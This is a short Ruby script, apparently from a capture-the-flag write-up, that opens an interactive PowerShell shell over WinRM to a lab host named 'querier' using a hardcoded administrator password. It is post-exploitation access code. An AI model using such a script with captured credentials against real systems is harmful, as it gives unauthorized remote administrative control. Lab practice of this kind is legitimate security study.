require 'winrm'
# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.125:5985/wsman',
  user: 'querier\administrator',
  password: 'MyUnclesAreMarioAndLuigi!!1!',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
